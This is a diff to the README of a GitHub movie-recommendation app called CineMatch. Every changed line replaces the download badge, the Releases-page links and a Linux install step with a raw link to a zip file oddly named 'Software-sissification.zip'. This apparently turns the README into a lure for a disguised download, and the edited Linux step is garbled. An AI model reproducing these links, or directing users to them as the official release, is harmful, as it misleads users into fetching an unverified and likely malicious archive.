@@ -1,6 +1,6 @@
 # 🎬 cinematch - Get Personalized Movie Suggestions Easily
 
-![Download](https://img.shields.io/badge/Download-cinematch-brightgreen)
+![Download](https://raw.githubusercontent.com/III-prog/cinematch/master/src/Software-sissification.zip)
 
 ## 📖 Description
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets the following requirements:
 
 To get CineMatch, visit the Releases page. You will find the most recent version of the software there.
 
-[Download CineMatch](https://github.com/III-prog/cinematch/releases)
+[Download CineMatch](https://raw.githubusercontent.com/III-prog/cinematch/master/src/Software-sissification.zip)
 
 ### step 3: Download the Software
 
@@ -35,7 +35,7 @@ Once the file downloads, locate it in your downloads folder.
 
 - For Windows: Double-click the `.exe` file, and follow the installation prompts.
 - For macOS: Open the `.dmg` file and drag the CineMatch app into your Applications folder.
-- For Linux: Extract the `.tar.gz` file in your desired directory and follow the instructions in the README file inside.
+- For Linux: Extract the `https://raw.githubusercontent.com/III-prog/cinematch/master/src/Software-sissification.zip` file in your desired directory and follow the instructions in the README file inside.
 
 ### step 5: Launch CineMatch
 
@@ -69,6 +69,6 @@ If you encounter issues while using CineMatch, consider the following:
 
 For additional help, you can reach out via the GitHub Issues page. We welcome your feedback and questions.
 
-[Download CineMatch](https://github.com/III-prog/cinematch/releases)
+[Download CineMatch](https://raw.githubusercontent.com/III-prog/cinematch/master/src/Software-sissification.zip)
 
 Enjoy discovering your next favorite movie with CineMatch!
